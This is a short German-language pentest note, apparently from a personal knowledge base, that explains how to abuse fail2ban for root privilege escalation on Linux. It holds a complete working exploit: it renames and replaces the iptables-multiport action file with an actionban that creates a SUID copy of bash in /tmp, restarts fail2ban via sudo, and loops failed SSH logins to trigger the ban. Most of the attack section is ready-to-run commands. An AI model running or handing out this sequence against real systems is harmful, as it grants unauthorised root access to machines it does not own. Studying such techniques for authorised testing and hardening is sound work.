---
tags: [technique, privesc, linux]
---
# fail2ban Abuse

> fail2ban sperrt verdächtige IPs und führt dabei **Action-Befehle als root** aus. Hat man Schreibrecht auf die Action-Config + darf fail2ban (neu)starten → RCE als root.

## Voraussetzungen
- Schreibrecht im `action.d`-Ordner (oft über eine Gruppe wie `security`):
```bash
ls -la /etc/fail2ban/action.d/
# drwxrwx--- root <gruppe>   <- in <gruppe>? => schreiben erlaubt
sudo -l                      # NOPASSWD auf fail2ban restart
```

> [!note] Verzeichnis- vs. Datei-Recht
> Ordner-Schreibrecht erlaubt umbenennen/erstellen/löschen – **nicht** die root-Datei direkt überschreiben. => In diesem Fall kann man Datei umbenennen, dann neu anlegen.

## Action-Datei
fail2ban führt die Shell-Befehle dieser Felder als root aus:

| Feld                           | Wann                        |
| ------------------------------ | --------------------------- |
| `actionban`                    | **bei Ban** ← Angriffspunkt |
| `actionstart/stop/check/unban` | Rest – **leer lassen**      |

## Exploit
```bash
cd /etc/fail2ban/action.d/
mv iptables-multiport.conf iptables-multiport.conf.bak
cat > iptables-multiport.conf << 'EOF'
[Definition]
actionstart =
actionstop =
actioncheck =
actionban = cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
actionunban =
EOF
sudo /etc/init.d/fail2ban restart
```
Ban provozieren (mehrere fehlgeschlagene SSH-Logins):
```bash
for i in $(seq 1 10); do ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no bad@<ziel>; done
```
=> Ban feuert `actionban` als root → [[SUID Abuse|SUID-bash]] → `/tmp/rootbash -p`.
